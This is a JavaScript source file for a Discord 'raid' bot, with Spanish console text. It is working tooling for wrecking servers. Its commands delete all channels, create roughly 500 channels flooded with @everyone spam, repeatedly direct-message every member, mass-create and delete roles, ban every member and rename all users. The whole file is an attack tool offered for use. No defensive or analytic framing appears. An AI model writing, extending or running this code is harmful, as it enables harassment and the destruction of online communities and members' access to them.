const Discord = require("discord.js");
const client = new Discord.Client();
client.config = require("./src/config.json");
let Prefix = client.config.Prefix



client.on("ready", () => {
    console.log(`Iniciando bot raid...`);
    console.log(`Comandos:\n Nuke \n Raid \n mdall \n Croles \n Droles \n Banall \n Nick \n List `);
    client.user.setActivity(`Help`,{ type: 'PLAYING'});
  }
);




client.on("message", message => {
  if (message.author.bot) return;
  
  if (message.content === Prefix + 'nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(client.config.ChannelName, {
      type: 'text'
    }).then(channel => {
      channel.send(`@everyone ${client.config.MsgRaid}`)
    });
   }
  }
);
 



client.on("message", message => {
    if (message.author.bot) return;
          
    if (message.content === Prefix + 'raid') {
      for (let i = 0; i <= 500; i++) {
        message.guild.channels.create(client.config.ChannelName, {
          type: 'text'
        }).then(channel => {
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`) 
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)
          channel.send(`@everyone ${client.config.MsgRaid}`)     
        })
      }
    }
  }
);




client.on("message", message => {
  
  if (message.author.bot) return;
                      
    if(message.content === Prefix + "mdall"){
      message.guild.members.cache.forEach(member => {
        setInterval(function(){
          member.send(`@everyone ${client.config.MsgRaid}`).catch(error => {});
          member.send(`@everyone ${client.config.MsgRaid}`).catch(error => {});
          member.send(`@everyone ${client.config.MsgRaid}`).catch(error => {});
          member.send(`@everyone ${client.config.MsgRaid}`).catch(error => {});
          member.send(`@everyone ${client.config.MsgRaid}`).catch(error => {});         
        },450);
      });
    }
  }
);
 

 

client.on("message", message => {
  if (message.author.bot) return;
              
    if (message.content === Prefix + 'croles') {
      for (let i = 0; i <= 200; i++) {
          message.guild.roles.create({data: {name: client.config.RoleName,color: client.config.RoleColor,},reason: client.config.RoleReason,})
      };
    }
  }
);




client.on("message", message => {
  if (message.author.bot) return;
           
   if (message.content === Prefix + 'droles') {
       message.guild.roles.delete()
   }
  }
);




client.on("message", message => {
    if (message.author.bot) return;
  
    if (message.content === Prefix +'banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
       m.ban()
      });
    }
  }
); 
 



client.on("message", msg => {
  const args = msg.content.slice().trim().split(/ +/g );
  const command = args.shift().toLowerCase();

    if (command === Prefix + 'nick'){
      msg.delete()
      let nickname = args.join(" ");
      var i = 0;
      msg.guild.members.cache.forEach(member =>{
        i++
      });
      msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
      msg.guild.members.cache.forEach(member =>{
        member.setNickname(nickname)
      });
      }
    }
);
 



client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();

   if (command === Prefix + 'list') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`**Channels:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
    }
  }
);
 


client.login(client.config.Token);
 